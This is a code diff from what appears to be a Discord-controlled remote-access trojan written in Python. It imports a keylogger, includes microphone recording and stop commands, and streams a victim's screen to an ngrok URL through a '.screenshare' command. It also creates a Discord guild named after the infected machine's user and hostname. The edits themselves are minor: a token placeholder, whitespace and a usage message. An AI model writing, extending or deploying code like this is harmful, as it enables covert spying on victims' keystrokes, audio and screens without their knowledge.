@@ -8,7 +8,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'TOKEN'
+TOKEN = 'TOKENHERE'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -427,8 +427,6 @@ async def stoprecord(ctx: commands.Context):
     else:
         await ctx.send("no active mic recording session here!")
 
-
-
 async def MakeandJoinGuild(guild):
     bot_user, bot_machine = get_current_userAndMachine()
     formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
@@ -611,13 +609,13 @@ async def on_message(message):
                 await recordmic(ctx, time=time)
         elif command == ".screenshare":
             if len(arg) < 1:
-                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
+                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url>`")
                 return
 
             url = arg[0]
 
             if not url.startswith(("https://", "http://")):
-                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url> <ngrok-port>`")
+                await ctx.send("wrong formatting, should be `.screenshare <ngrok-url>`")
                 return
 
             if ctx.channel.id in activeStreaming:
